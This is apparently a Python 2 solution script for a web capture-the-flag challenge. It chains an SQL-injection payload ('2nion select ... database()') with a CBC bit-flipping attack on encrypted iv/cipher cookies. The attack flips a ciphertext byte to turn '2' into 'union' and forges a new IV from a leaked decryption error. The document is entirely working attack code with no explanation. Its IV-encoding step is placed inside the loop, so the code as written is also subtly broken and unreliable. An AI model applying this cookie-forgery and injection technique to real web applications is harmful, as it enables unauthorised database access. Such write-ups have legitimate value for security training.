# -*- coding:utf8 -*-

import base64

import requests

import re

import urllib

url ="http://ctf5.shiyanbar.com/web/jiandan/index.php"

payload ="0 2nion select * from ((select 1)a join (select database())b join (select 3)c);"+chr(0)

data = {

'id':payload

}

cookie = requests.post(url,data = data).headers['Set-Cookie']

iv = re.findall(r'iv=(.+),',cookie)[0]

cipher = base64.b64decode(urllib.unquote(re.findall(r'cipher=(.+)',cookie)[0]))

iv_row =list(base64.b64decode(urllib.unquote(iv)))

cipher_row =list(cipher)

offset =6

cipher_row[offset] =chr(ord(cipher_row[offset]) ^ord("2") ^ord("u"))

cipher_new = urllib.quote(base64.b64encode("".join(cipher_row)))

cookies = {

"iv" : iv,

"cipher" : cipher_new

}

mistake = requests.get(url,cookies = cookies).content

wrong = base64.b64decode(re.findall(r'\(\'(.+)\'\)',mistake)[0])

iv_new =''

plaintext ="a:1:{s:2:\"id\";s:"

for x in range(16):

    iv_new = iv_new +chr(ord(iv_row[x]) ^ord(wrong[x]) ^ord(plaintext[x]))

    iv_new = urllib.quote(base64.b64encode(iv_new))

cookies2 = {

"iv" : iv_new,

"cipher" : cipher_new

}

result = requests.get(url,cookies = cookies2).content

print result

